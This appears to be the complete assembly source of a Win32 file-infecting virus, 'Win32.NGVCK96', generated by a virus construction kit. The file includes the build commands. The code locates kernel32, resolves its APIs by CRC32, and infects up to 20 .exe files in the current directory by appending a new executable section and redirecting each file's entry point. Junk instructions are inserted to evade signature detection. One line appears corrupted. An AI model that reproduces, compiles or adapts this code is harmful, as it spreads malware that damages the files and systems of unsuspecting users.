              
;
;
; Win32.NGVCK96 by SnakeByte
;
; This Virus is created with the Next Generation VCK by SnakeByte
; to get a copy of this Virus Construction Kit check www.kryptocrew.de/snakebyte/
;
; Virus Description : 
;
;  Virusname              : Win32.NGVCK96
;  Author                 : SnakeByte
;  Operating System       : Win32 ( Win9x, NT, ME, 2000 )
;  Target Files           : Windows Portable Executable
;  Created with           : Next Generation VCK 0.45
;  Creation Date          : 3/12/2015
;  Infection Mark         : NGVC
;  Infection Type         : adding a new section 
;  API Search             : CRC32
;  Entry Point Obscurity  : No
;  Locate Kernel by       : searching on fixed locations
;  Anti Bait              : No
;  Travelling             : No
;  Encrypt Hostcode       : No
;  Per-Process Residency  : No
;  SelfMailing            : No
;  mIRC Spreading         : No
;  Trash Ratio            : 1 to 20
;  No. of Files to infect : 20
;
;
;
; Compile this source code with (TASM 5.0) : 
;
;     tasm32 /z /ml /m1 <FileName>,,;
;     tlink32 -Tpe -c <FileName>,<FileName>,, import32.lib
;
; If you edit this source or create another virus from this,
; then please send me a copy so that I know what else I could add
;    Hope you enjoy this ... SnakeByte [ SnakeByte@kryptocrew.de ]
;

.586p
.model flat
jumps
.radix 16

 extrn ExitProcess:PROC

.data
 VirusSize equ (offset EndVirus - offset Virus )
 NumberOfApis equ 12d

VirusCode:
Virus:
 call Delta                             ; Get Delta Offset

Delta:
                                        ; add esp, 4
 inc esp
 add esp, 3d
 mov edx, dword ptr [esp-4]
                                        ; mov ebp, edx
 mov ebp, edx
 sub ebp, offset Delta
 jmp KernelSearchStart


;       [ ///// * Create the CRC32 of an API * \\\\\ ]

CRC32:
 pushad
                                        ; mov ecx, esi
 push esi
 pop ecx
LenCRC:
                                        ; add ecx, 1
 sub ecx, -1d
 cmp byte ptr [ecx], 0
 jne LenCRC
 sub ecx, esi
                                        ; mov edi, ecx
                                        ; clear edi
 sub edi, edi
 add edi, ecx
                                        ; add edi, 1
 inc edi
 cld
                                        ; clear eax
 push 0
 pop eax
 sub eax, 1
                                        ; mov edx, eax
 mov edx, eax
NextByteCRC:
                                        ; clear ecx
 xor ecx, ecx
                                        ; clear ebx
 xor ebx, ebx
 mov cl, byte ptr [esi]
                                        ; add esi, 1
 inc esi
 xor cl, al
 mov al, ah
 mov ah, dl
 mov dl, dh
 mov dh, 8
NextBitCRC:
 shr bx, 1
 rcr cx, 1
jnc NoCRC
 xor cx,08320h
 xor bx,0EDB8h
NoCRC:
 dec dh
jnz NextBitCRC
 xor eax, ecx
 xor edx, ebx
 dec edi
jnz NextByteCRC
 not edx
 not eax
 mov ecx, edx
 rol ecx, 16d
 mov cx, ax
 mov dword ptr [ebp+APICRC32], 0
 xor dword ptr [ebp+APICRC32], ecx
 popad
ret



;        [ ///// * Search Kernel Procedure * \\\\\ ]

KernelSearchStart:
                                        ; store old EIP and ImageBase
 mov edx, dword ptr [ebp+OldBase]

 and dword ptr [ebp+Trash1], 657540     ; Trash
 mov dword ptr [ebp+retBase], edx

 mov eax, dword ptr [ebp+OldEIP]

 mov dword ptr [ebp+retEIP], eax


                                        ; get Kernel by using hardcoded values
 mov edi, 077e00000h
 call GetKernel32
 jnc GetApis
 mov edi, 0bff70000h
 call GetKernel32
 jnc GetApis
 mov edi, 077f00000h
 call GetKernel32
 jnc GetApis

 jmp NoKernel
GetKernel32:
 pushad
                                        ; clear esi
 xor esi, esi

 lea eax, dword ptr [esp-8h]
 xchg eax, dword ptr fs:[esi]
 lea edx, [ebp+GetKernel32Exception]
 xchg ecx, edx

 push ecx
 push eax

                                        ; set maximum search count
 mov dword ptr [ebp+K32Trys], 41891
 sub dword ptr [ebp+K32Trys], 1891d

GK1:                                    ; check for DOS-EXE Stub
 cmp dword ptr [ebp+K32Trys], 0h
 jz GetKernel32NotFound
                                        ; check for ZM
 cmp word ptr [edi], 'ZM'
 je CheckPE
 mov dword ptr [ebp+Trash1], ebx        ; Trash

GK2:
 or ebx, 53457146d                      ; Trash
 inc edi
 and edx, 67809727d                     ; Trash
 sub edi, 65537d
 inc dword ptr [ebp+K32Trys]
 sub dword ptr [ebp+K32Trys], 2
 jmp GK1

CheckPE:                                ; Check if found file is a win32 exe
 mov edx, [edi+3Ch]
 neg edi
 sub edx, edi
 neg edi
                                        ; check for EP
 movzx eax, word ptr [edx]
 sub eax, 'EP'
 jz CheckDLL
 jmp GK2

CheckDLL:
                                        ; check if the file is a DLL
                                        ; add edx, 22
 dec edx
 add edx, 23d
                                        ; clear ecx
 mov ecx, 0
 mov cx, word ptr [edx]
 and cx, 0F000h
 cmp cx, 02000h
 je GotDLL
 jmp GK2
GotDLL:                                 ; we found a DLL file
 add edx, -22d


KernelFound:
 mov dword ptr [ebp+KernelPE], -1
 and dword ptr [ebp+KernelPE], edx
 mov dword ptr [ebp+KernelMZ], edi
 mov eax, dword ptr [ebp+KernelPE]
                                        ; get Export-Table
 mov esi, [eax+78h]
 add esi, [ebp+KernelMZ]
                                        ; add esi, 28
 dec esi
 add esi, 29d
                                        ; get ATableVA
 mov eax, dword ptr [esi]
                                        ; add esi, 4
 add esi, 4d
 add eax, [ebp+KernelMZ]
 mov dword ptr [ebp+ATableVA], eax
False add eax, [ebp+KernelMZ]
 mov dword ptr [ebp+NTableVA], eax
                                        ; get OTableVA
 mov eax, dword ptr [esi]
 add eax, [ebp+KernelMZ]
 mov dword ptr [ebp+OTableVA], eax
 and ecx, 70154185d                     ; Trash
                                        ; clear edi
 and edi, 0

 pop dword ptr fs:[edi]
 pop edx
 popad
 clc
ret

GetKernel32Exception:
                                        ; clear ecx
 and ecx, 0

 mov ebx, dword ptr fs:[ecx]
 mov esp, dword ptr [ebx]
GetKernel32NotFound:
                                        ; clear ecx
 mov ecx, 48941d
 sub ecx, 48941d

 pop dword ptr fs:[ecx]
 pop edx
 popad
 stc
ret


;            [ ///// * Align Procedure * \\\\\ ]

Align:                                  ; align File or Section Size
 pushad
 mov eax, dword ptr [ebp+AlignReg1]
 mov ecx, dword ptr [ebp+AlignReg2]
                                        ; clear edx
 mov edx, -45957d
 add edx, 45957d
 div ecx
                                        ; add eax, 1
 inc eax
 mul ecx
 inc ebx                                ; Trash
 mov dword ptr [ebp+AlignReg1], 0h
 add dword ptr [ebp+AlignReg1], eax
 popad
ret



;          [ ///// * Execute Original File * \\\\\ ]

NoKernel:
                                        ; store old EIP and ImageBase
 mov ebx, dword ptr [ebp+OldEIP]

 mov dword ptr [ebp+retEIP], 0
 add dword ptr [ebp+retEIP], ebx

 mov ecx, dword ptr [ebp+OldBase]

 mov dword ptr [ebp+retBase], ecx
 sub eax, 93705956d                     ; Trash



ExecuteHost:                            ; Start the infected File

                                        ; check if we are first generation
                                        ; add ebp, 1
 sub ebp, -1d
 dec ebp
 jz FirstGenHost
 mov ebx,12345678h
 org $-4
 retEIP dd 0h
 add ebx,12345678h
 org $-4
 retBase dd 0h
 jmp ebx



;           [ ///// * Outbreak Procedure * \\\\\ ]


Outbreak:                               ; Lets infect some files...


;   [ ///// * Infect Current Directory Procedure * \\\\\ ]

InfectCurDir:                           ; Infect the current directory
 lea esi, [ebp+filemask]
 sar eax, 4d                            ; Trash
 xchg edi, esi

                                        ; Set Infection Counter
                                        ; mov ecx, 20
 mov ecx, 0
 add ecx, 20d
 mov dword ptr [ebp+InfCounter], 0
 add dword ptr [ebp+InfCounter], ecx
                                        ; Find File to infect
 call FindFirstFileProc
                                        ; add eax, 1
 add eax, 1d
                                        ; add eax, 1
 add eax, 1d
 dec eax
 jz EndInfectCurDir

InfectCurDirFile:                       ; Infect the file
 call InfectFile
                                        ; Check Infection Counter
 cmp [ebp+InfCounter], 0h
 je EndInfectCurDir
                                        ; find more Files
 call FindNextFileProc
 cmp eax, 0
 jne InfectCurDirFile

EndInfectCurDir:
                                        ; Close the Handle
                                        ; clear edx
 sub edx, edx
 add edx, dword ptr [ebp+FindHandle]
 push edx
 call dword ptr [ebp+XFindClose]

 jmp ExecuteHost


;          [ ///// * APISearch - Procedure * \\\\\ ]


GetApis:                                ; Retrive the APIs we need


                                        ; number of API's we're looking for
                                        ; clear eax
 mov eax, -45429d
 add eax, 45429d
 add eax, NumberOfApis

                                        ; load API Names and Offsets
 lea ebx, [ebp+APIOffsets]
 xchg edx, ebx

 lea ebx, [ebp+APINames]
 xchg ebx, edi


GetApisLoop: 

                                        ; search 'em
                                        ; edi points to the CRC
                                        ; edx points to the offset

 call SearchAPI1
                                        ; add edi, 4
 add edi, 4d
 mov esi, dword ptr [ebp+TempAPI]
 mov dword ptr [edx], esi
                                        ; add edx, 4
 add edx, 4d
 sub eax, 1
 jnz GetApisLoop
 lea eax, [ebp+Imagehlp]
 xchg ecx, eax

                                        ; mov ebx, 1
 mov ebx, 0
 add ebx, 1d
 mov edx, offset CheckSumMFA
 add edx, ebp

 lea esi, [ebp+XCheckSumMappedFile]

 call GetOtherApis
 jmp Outbreak



;      [ ///// * Prepare Infection Procedure * \\\\\ ]

InfectFile:                             ; Infect a file
                                        ; get and remove file attributes
 mov eax, ebp
 add eax, offset WFD_szFileName

 push eax
 call dword ptr [ebp+XGetFileAttributesA]
 mov dword ptr [ebp+Attributes], eax
 push 80h
 mov eax, ebp
 add eax, offset WFD_szFileName


 push eax
 call dword ptr [ebp+XSetFileAttributesA]
 test eax, eax
 jz NoInfection
                                        ; check for maximum filesize
 cmp dword ptr [ebp+WFD_nFileSizeHigh], 0
 jne NoInfection
                                        ; check for minimum filesize
 mov ecx, offset WFD_nFileSizeLow
 add ecx, ebp

 cmp dword ptr [ecx], 20000d
 jbe NoInfection
 call OpenFile                          ; open the file
 jc NoInfection
                                        ; check for EXE File
 mov esi, dword ptr [ebp+MapAddress]
                                        ; check for ZM
 movzx edx, word ptr [esi]
 sub edx, 'ZM'
 jz Goodfile
 jmp Notagoodfile

Goodfile:
 cmp word ptr [esi+3Ch], 0h
 jne _Notagoodfile
 jmp Notagoodfile
_Notagoodfile:
 push dword ptr [esi+3Ch]
 pop ecx
                                        ; check if header lies inside the file
 cmp dword ptr [ebp+WFD_nFileSizeLow],ecx
 jb Notagoodfile
 add ecx, esi
                                        ; check for PE Header
                                        ; check for EP
 movzx ebx, word ptr [ecx]
 sub ebx, 'EP'
 jz Goodfile2
                                        ; mov eax, 51127
 mov eax, 0
 add eax, 51127d
 sar edx, 15d                           ; Trash
 cmp eax, 51127d
 je Notagoodfile

Goodfile2:
                                        ; check for previous Infection
 cmp dword ptr [ecx+4Ch], 'NGVC'
 jz Notagoodfile
                                        ; check for OBJ
 mov dx, word ptr [ecx+16h]
 and dx, 00002h
 cmp dx, 00002h
 jne Notagoodfile
 call InfectEXE                         ; Infect the file
 jc NoInfection2

Notagoodfile:
 call UnMapFile

NoInfection2:
 add dword ptr [ebp+Trash1], eax        ; Trash

                                        ; restore the file attributes
 mov eax, dword ptr [ebp+Attributes]
 push eax
 lea ebx, [ebp+WFD_szFileName]

 push ebx
 call dword ptr [ebp+XSetFileAttributesA]

NoInfection:
ret




;      [ ///// * EXE FILE Infection Procedure * \\\\\ ]

InfectEXE:                              ; infect an exe file
                                        ; clear edx
 sub edx, edx
 add edx, dword ptr [ebp+MapAddress]
                                        ; retrieve PE - Header
 mov esi, [edx+3Ch]
 add esi, edx
                                        ; get File Alignment
                                        ; add esi, 60
 dec esi
 add esi, 61d
 mov ecx, [esi]
 inc esi
 sub esi, 61d
 mov dword ptr [ebp+filealign], ecx
 mov esi, dword ptr [ebp+MapAddress]
                                        ; retrieve PE - Header again
 mov ebx, dword ptr [esi+3Ch]
 inc edx                                ; Trash
 add ebx, esi
                                        ; infection by adding a new section
                                        ; as described by Lord Julus
 mov dword ptr [ebp+PEheader], 0
 xor dword ptr [ebp+PEheader], ebx
                                        ; get old Entrypoint
 mov ecx, dword ptr [ebx+28h]
 mov dword ptr [ebp+OldEIP], 0
 add dword ptr [ebp+OldEIP], ecx
 mov eax, dword ptr [ebx+34h]
 mov dword ptr [ebp+OldBase], eax
 mov edx, [ebx+38h]
 mov dword ptr [ebp+sectionalign], edx
                                        ; Get last section
 mov eax, [ebx+74h]
 shl eax, 3
                                        ; clear ecx
 push 0
 pop ecx
 mov cx, word ptr [ebx+6h]
 mov edx, 28h
 pushad
 mov eax, ecx
 mul edx
 mov dword ptr [ebp+Misc1], eax
 popad
 push dword ptr [ebp+Misc1]
 pop ecx
 add ebx, 78h
 add ebx, eax
 add ebx, ecx
 lea eax, [ebp+newsection]


 xchg eax, ebx
 push eax
                                        ; Calculate the RVA of the new section
 mov edx, [eax-5*8+8d]
 add edx, [eax-5*8+12d]
 mov ecx, dword ptr [ebp + offset sectionalign]
 mov dword ptr [ebp+AlignReg1], -1
 and dword ptr [ebp+AlignReg1], edx
 mov dword ptr [ebp+AlignReg2], -1
 and dword ptr [ebp+AlignReg2], ecx
 mov dword ptr [ebp+nsphysicalsize], -1
 and dword ptr [ebp+nsphysicalsize], edx
 Call Align
                                        ; mov edx, -1
 mov edx, -1d
 and edx, dword ptr [ebp+AlignReg1]
 mov dword ptr [ebp + offset nsRVA], edx
                                        ;  calculate the virtual size of the new section
 mov ecx, dword ptr [ebp + offset sectionalign]
 mov dword ptr [ebp+AlignReg1], -1
 and dword ptr [ebp+AlignReg1], VirusSize
 mov dword ptr [ebp+AlignReg2], 0
 add dword ptr [ebp+AlignReg2], ecx
 Call Align
                                        ; clear edx
 mov edx, -54045d
 add edx, 54045d
 add edx, dword ptr [ebp+AlignReg1]
 push edx
 pop dword ptr [ebp+nsvirtualsize]
                                        ; calculate physical offset
 mov ebx,[eax-5*8+20d]
 add ebx,[eax-5*8+16d]
 mov edx,dword ptr [ebp + offset filealign]
 mov dword ptr [ebp+AlignReg1], ebx
 mov dword ptr [ebp+AlignReg2], edx
 Call Align
 push dword ptr [ebp+AlignReg1]
 pop ebx
 mov dword ptr [ebp+nsphysicaloffset], 0
 add dword ptr [ebp+nsphysicaloffset], ebx
                                        ; calculate new size
 mov edx, dword ptr [ebp+filealign]
 mov ecx, ebx
 add ecx, VirusSize
 mov dword ptr [ebp+AlignReg2], edx
 mov dword ptr [ebp+AlignReg1], ecx
 call Align
 sub ebx, ecx                           ; Trash
 mov ecx, dword ptr [ebp+AlignReg1]
                                        ; unmap file and map it again with new size
 mov dword ptr [ebp+NewSize], ecx
 pushad
 and eax, 83113253d                     ; Trash
 Call UnMapFile2
 xor ebx, edx                           ; Trash
 popad
 mov dword ptr [ebp+WFD_nFileSizeLow], ecx
 call CreateMap
 jc NoEXE
                                        ; mov edx, 64
 mov edx, 0
 add edx, 64d
 lea esi, [ebp+newsection]

 pop ecx
WriteNewSectionLoop:
 mov ah, byte ptr [esi]
 mov byte ptr [ecx], ah
 add edx, -1
                                        ; add ecx, 1
 add ecx, 1d
                                        ; add esi, 1
 add esi, 1d
 test edx, edx
 jnz WriteNewSectionLoop
                                        ; increase section numbers
                                        ; clear ebx
 mov ebx, 0
 xor ebx, dword ptr [ebp+PEheader]
 sub word ptr [ebx+06h], -1
 push dword ptr [ebp+nsRVA]
 pop ecx
 mov dword ptr [ebp+NewEIP], ecx
                                        ; set new EIP
 mov dword ptr  [ebx+28h], ecx
                                        ; set infection mark
 mov dword ptr [ebx+4Ch], 0h
 add dword ptr [ebx+4Ch], 'NGVC'
 mov ecx, dword ptr [ebp+nsphysicaloffset]
 push ecx
                                        ; Append Virus
 pop edi
 lea eax, [ebp+Virus]
 xchg eax, esi

 add edi, dword ptr [ebp+MapAddress]
 mov edx, VirusSize

AppendLoop:
 movsb
 dec edx
 jnz AppendLoop
 cmp dword ptr [ebp+XCheckSumMappedFile], -1d
 je NoCheckSum
 mov ebx, offset CheckSum
 add ebx, ebp

 push ebx
 lea eax, [ebp+HeaderSum]

 push eax
 push dword ptr [ebp+NewSize]
 pop ecx
 push ecx
 push dword ptr [ebp+MapAddress]
 call dword ptr [ebp+XCheckSumMappedFile]
                                        ; clear ebx
 sub ebx, ebx
 xor ebx, dword ptr [ebp+MapAddress]
 mov ebx, [ebx+3Ch]
 add ebx, dword ptr [ebp+MapAddress]
 mov eax, dword ptr [ebp+CheckSum]
 mov dword ptr [ebx+58h], eax
NoCheckSum:
                                        ; decrease Infection Counter
 mov eax, dword ptr [ebp+InfCounter]
 dec eax
 mov dword ptr [ebp+InfCounter], eax
 clc
ret

NoEXE:
 pop ebx
 stc
ret



;                  [ ///// * Data * \\\\\ ]

Data:
 MapAddress  dd 0h
 filealign   dd 0h
 TempApisearch3 dd 0h
 FILETIME                STRUC
 FT_dwLowDateTime        dd       ?
 FT_dwHighDateTime       dd       ?
 FILETIME ENDS

 WIN32_FIND_DATA         label    byte
 WFD_dwFileAttributes    dd       ?
 WFD_ftCreationTime      FILETIME ?
 WFD_ftLastAccessTime    FILETIME ?
 WFD_ftLastWriteTime     FILETIME ?
 WFD_nFileSizeHigh       dd       ?
 WFD_nFileSizeLow        dd       ?
 WFD_dwReserved0         dd       ?
 WFD_dwReserved1         dd       ?
 WFD_szFileName          db       260d dup (?)
 WFD_szAlternateFileName db       13   dup (?)
 WFD_szAlternateEnding   db       03   dup (?)

 filemask    db '*.exe',0
 OTableVA    dd 0h
 Imagehlp    db 'imagehlp.dll',0
 FindHandle  dd 0h
 APICRC32    dd 0h
 OldBase     dd 400000h
newsection:                           ; Settings for the new section
 nsname           db '.NGVCKvx'
 nsvirtualsize    dd 0                ; Virtual Size
 nsRVA            dd 0                ; Relative Virtual Address
 nsphysicalsize   dd 0                ; Size of Raw Data
 nsphysicaloffset dd 0                ; Pointer to Size of Raw Data
 nsreserved       dd 0,0,0            ; reserved
 nsflags          db 40h,0,0,0c0h     ; Section is executable code and writeable

 AlignReg1   dd 0h
 counter     dw 0h

 APINames:
 dd 0AA700106h           ; FindNextFileA
 dd 0AE17EBEFh           ; FindFirstFileA
 dd 0FFC97C1Fh           ; GetProcAddress
 dd 08C892DDFh           ; CreateFileA
 dd 0C200BE21h           ; FindClose
 dd 04134D1ADh           ; LoadLibraryA
 dd 0C633D3DEh           ; GetFileAttributesA
 dd 068624A9Dh           ; CloseHandle
 dd 0797B49ECh           ; MapViewOfFile
 dd 094524B42h           ; UnmapViewOfFile
 dd 03C19E536h           ; SetFileAttributesA
 dd 096B2D96Ch           ; CreateFileMappingA

 InfCounter  dd 0h
 NTableVA    dd 0h
 NewSize     dd 0h
 CheckSum dd 0h
 K32Trys     dd 0h
 TempAPI     dd 0h
 KernelPE    dd 0h
 AlignReg2   dd 0h
 OldEIP      dd 0h
 HeaderSum dd 0h
 Attributes  dd 0h
 CheckSumMFA db 'CheckSumMappedFile',0
 ATableVA    dd 0h

 MapHandle   dd 0h

 APIOffsets:
 XFindNextFileA         dd 0h
 XFindFirstFileA        dd 0h
 XGetProcAddress        dd 0h
 XCreateFileA           dd 0h
 XFindClose             dd 0h
 XLoadLibraryA          dd 0h
 XGetFileAttributesA    dd 0h
 XCloseHandle           dd 0h
 XMapViewOfFile         dd 0h
 XUnmapViewOfFile       dd 0h
 XSetFileAttributesA    dd 0h
 XCreateFileMappingA    dd 0h

 Trash1      dd 0h
 KernelMZ    dd 0h
 FileHandle  dd 0h
 sectionalign   dd 0h
 XCheckSumMappedFile    dd 0h
 db 'Win32.NGVCK96 by SnakeByte',0
 Misc1       dd 0h
 NewEIP      dd 0h
 NTableTemp  dd 0h
 PEheader    dd 0h




;          [ ///// * FindFiles Procedure * \\\\\ ]


ClearOldData:                           ; we don't want waste in the fields
 pushad
 lea ecx, [ebp+WFD_szFileName]
 xchg ecx, ebx
 mov edx, 70522354d                     ; Trash

                                        ; mov eax, 276
 mov eax, ( 276d xor 30d )
 xor eax, 30d

ClearOldData2:
 inc dword ptr [ebp+Trash1]             ; Trash
 mov byte ptr [ebx], 0h
                                        ; add ebx, 1
 inc ebx
 dec eax
 jnz ClearOldData2
 popad
ret


FindNextFileProc:                       ; find another file
 call ClearOldData
 lea edx, [ebp+WIN32_FIND_DATA]
 xchg eax, edx

 push eax
 mov eax, dword ptr [ebp+FindHandle]
 push eax
 call dword ptr [ebp+XFindNextFileA]
ret

                                        ; Find the first file
FindFirstFileProc:
 call ClearOldData
 lea esi, [ebp+WIN32_FIND_DATA]
 xchg edx, esi

 push edx
 push edi
 call dword ptr [ebp+XFindFirstFileA]
 xor dword ptr [ebp+Trash1], 250896     ; Trash
 mov dword ptr [ebp+FindHandle], eax
ret





;          [ ///// * APISearch 1 Procedure * \\\\\ ]

                                        ; edi Points to API-CRC ( Virus )

SearchAPI1:                             ; Procedure to retrieve API Offsets
 pushad
                                        ; clear the counter
 mov word ptr [ebp+counter], 0h




 mov eax, dword ptr [ebp+NTableVA]


SearchNextApi1:                         ; search for the API's
 mov dword ptr [ebp+NTableTemp], eax
 mov edx, dword ptr [eax]
 add edx, [ebp+KernelMZ]
                                        ; mov eax, edx
 mov eax, edx
                                        ; mov esi, eax
 push eax
 pop esi
 push esi
 mov dword ptr [ebp+TempApisearch3], edi
 cld

                                        ; esi Points to API-Name ( Kernel )
                                        ; edi Points to API-Name CRC ( Virus )
                                        ; compare Names
                                        ; CRC32 Api Search
 call CRC32
 mov edx, dword ptr [ebp+APICRC32]
 sub edx, dword ptr [edi]
 test edx, edx
 jz FoundApi1
 xor ecx, 73655960d                     ; Trash

ApiNotFound:                            ; we did not find it :(
 pop esi
                                        ; mov edi, -1
 mov edi, ( -1d xor 37d )
 xor edi, 37d
 and edi, dword ptr [ebp+TempApisearch3]
 mov eax, dword ptr [ebp+NTableTemp]
                                        ; add eax, 4
 add eax, 4d
 inc word ptr [ebp+counter]
 cmp word ptr [ebp+counter], 2001h
 jne SearchNextApi1
 jmp NotFoundApi1

FoundApi1:                              ; we found the API
                                        ; clear Stack
 pop eax
                                        ; retrieve the offset
 movzx ebx, word ptr [ebp+counter]
                                        ; point to ordinal Table
 clc 
 rcl ebx, 1                             ; multiply with 2
 add ebx, dword ptr [ebp+OTableVA]
 mov ecx, ebx
                                        ; clear ebx
 mov ebx, 0
 inc eax                                ; Trash
 mov bx, word ptr [ecx]
 shl ebx, 2h
 add ebx, dword ptr [ebp+ATableVA]
                                        ; convert to RVA
 mov ecx, dword ptr [ebp+KernelMZ]
 add ecx, dword ptr [ebx]
 mov dword ptr [ebp+TempAPI], 0
 add dword ptr [ebp+TempAPI], ecx
 popad
ret

NotFoundApi1:
                                        ; we did not get one of the nessecairy API's
                                        ; so we quit !
 pop edx
 popad
 jmp ExecuteHost



;        [ ///// * File Handling Procedure * \\\\\ ]

                                        ; File Handling
OpenFile:                               ; Open File
 push 0
 push 0
 push 3
 push 0
 push 1
 mov eax, 80000000h or 40000000h
 push eax
 lea edi, [ebp+WFD_szFileName]

 push edi
 call dword ptr [ebp+XCreateFileA]

 inc eax
 jz Closed
 dec eax

 mov dword ptr [ebp+FileHandle], eax

CreateMap:                              ; Map the file
 push dword ptr [ebp+WFD_nFileSizeLow]
 pop ebx
 push ebx
 push 0
 push ebx
 push 0
                                        ; mov ecx, 4
 mov ecx, 4d
 push ecx
 push 0
 push dword ptr [ebp+FileHandle]
 call dword ptr [ebp+XCreateFileMappingA]
 mov dword ptr [ebp+MapHandle], eax
 pop ebx
                                        ; add eax, 1
 sub eax, -1d
 dec eax
 jz CloseFile
 push ebx
 push 0
 push 0
                                        ; mov eax, 2
 mov eax, ( 2d + 39d )
 sub eax, 39d
 push eax
 push dword ptr [ebp+MapHandle]
 call dword ptr [ebp+XMapViewOfFile]
 test eax, eax
 jz UnMapFile
 mov dword ptr [ebp+MapAddress], eax
 clc
ret

UnMapFile:                              ; Unmap the file and store it to disk
 Call UnMapFile2

CloseFile:                              ; Close the file
 push dword ptr [ebp+FileHandle]
 Call [ebp+XCloseHandle]

Closed:
 stc
ret

UnMapFile2:
 push dword ptr [ebp+MapAddress]
 call dword ptr [ebp+XUnmapViewOfFile]
 push dword ptr [ebp+MapHandle]
 call dword ptr [ebp+XCloseHandle]
ret



;        [ ///// * Retrieve non Kernel API's * \\\\\ ]

GetOtherApis:
 push ecx 
 push edx 
 push ecx
 call dword ptr [ebp+XLoadLibraryA]
 pop edx 
 pop ecx 
                                        ; mov ecx, eax
 push eax
 pop ecx
GetOtherApiLoop:
 push ecx 
 push edx 
 push edx
 push ecx
 call dword ptr [ebp+XGetProcAddress]
 pop edx 
 pop ecx 
 mov dword ptr [esi], eax
                                        ; add esi, 4
 add esi, 4d
 sub ebx, 1
 cmp ebx, 0
 je GetOtherApiEnd
GetOtherApiLoop2:
                                        ; add edx, 1
 add edx, 1d
 cmp byte ptr [edx], 0
 jne GetOtherApiLoop2
                                        ; add edx, 1
 sub edx, -1d
 jmp GetOtherApiLoop
GetOtherApiEnd:
ret



CryptEnd:
 ror ecx, 5d                            ; Trash
EndVirus:

;          [ //////////////////\\\\\\\\\\\\\\\\\\\ ]
;          [ ///// * First Generation Host * \\\\\ ]


.code                                   ; Lets place some code
                                        ; to start the virus
                                        ; which is inside the
                                        ; data section
FakeCode:

 push offset VirusCode

 ret


FirstGenHost:                           ; exit for the first generation
 push 0h
 sub ebx, 45777956d                     ; Trash
 call ExitProcess



end FakeCode

